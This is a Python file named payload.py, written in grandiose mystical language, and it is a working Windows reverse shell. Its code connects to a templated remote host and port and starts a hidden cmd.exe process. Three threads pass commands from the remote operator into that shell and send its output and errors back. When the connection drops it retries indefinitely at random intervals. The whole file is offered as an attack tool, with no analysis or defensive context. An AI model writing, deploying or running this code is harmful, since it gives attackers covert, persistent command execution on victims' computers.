# payload.py
# The Transfigured Soul. A true, persistent conduit of will.

import os
import socket
import subprocess
import threading
import time
import random

# --- DYNAMIC CONFIG ---
RHOST = "##RHOST##"
RPORT = ##RPORT##

def run_conduit():
    """
    The eternal reverse shell. Binds a persistent cmd.exe to the socket.
    This is the pure, Netcat-like soul.
    """
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((RHOST, RPORT))

            # Spawn ONE persistent cmd.exe process for the entire connection.
            CREATE_NO_WINDOW = 0x08000000
            p = subprocess.Popen(['cmd.exe'], 
                                 stdin=subprocess.PIPE, 
                                 stdout=subprocess.PIPE, 
                                 stderr=subprocess.PIPE, 
                                 creationflags=CREATE_NO_WINDOW,
                                 shell=True) # Use shell=True for better command handling

            # --- The Sacred Trinity of Streams ---

            # Guardian 1: Receives commands from Master and feeds them to the shell.
            def master_to_shell(s, p):
                try:
                    while True:
                        data = s.recv(1024)
                        if not data:
                            break
                        p.stdin.write(data)
                        p.stdin.flush()
                except:
                    pass
                s.close()
                p.terminate()

            # Guardian 2: Captures shell output and sends it to the Master.
            def shell_to_master(s, p):
                try:
                    while True:
                        # Read byte by byte to ensure immediate, interactive feedback.
                        data = p.stdout.read(1)
                        if not data:
                            break
                        s.send(data)
                except:
                    pass
                s.close()
                p.terminate()
            
            # Guardian 3: Captures shell errors and sends them to the Master.
            def error_to_master(s, p):
                try:
                    while True:
                        data = p.stderr.read(1)
                        if not data:
                            break
                        s.send(data)
                except:
                    pass
                s.close()
                p.terminate()

            # Start the three guardians in parallel threads.
            threading.Thread(target=master_to_shell, args=[s, p], daemon=True).start()
            threading.Thread(target=shell_to_master, args=[s, p], daemon=True).start()
            threading.Thread(target=error_to_master, args=[s, p], daemon=True).start()
            
            # Wait for the process to end (which happens when the connection breaks)
            p.wait()

        except Exception:
            # If connection fails, rest, then try again.
            time.sleep(random.randint(30, 60))
            continue

if __name__ == "__main__":
    run_conduit()